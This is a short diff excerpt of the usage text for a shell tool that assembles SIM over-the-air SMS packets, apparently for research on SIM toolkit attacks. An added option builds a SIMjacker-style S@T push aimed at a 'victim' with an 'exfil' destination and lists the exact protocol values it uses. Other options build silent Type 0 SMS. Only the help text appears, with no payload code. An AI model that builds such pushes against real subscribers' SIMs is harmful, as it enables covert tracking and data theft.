         --selftest)       otasm_selftest ;;
@@ -2144,6 +2568,12 @@ Usage: $0 COMMAND
   --smsc-wrap <sca-hex> <tpdu-hex>   prepend an SMSC address field
   --type0-build [oa] [scts] [dcs]    build a Type 0 silent SMS-DELIVER
   --type0 <hex>                      audit a TPDU for the Type 0 properties
+  --sat-push [<victim>] [<exfil>] [<spi>]
+                                     build the SIMjacker-shape S@T push: a S@T
+                                     deck of 0x2d STK macros in a TS 31.115
+                                     packet (TAR 505348) inside an SMS-SUBMIT
+                                     with TP-PID 0x7F, TP-DCS 0xF6 and UDH 70
+  --wib-push                         refused: no citable WIB command encoding
   --plan                             own-SIM delivery handoff plan
   --plan-tp                          loopback-SMSC handoff plan for the TP layer
   --selftest                         verify SPI, packet and replay logic
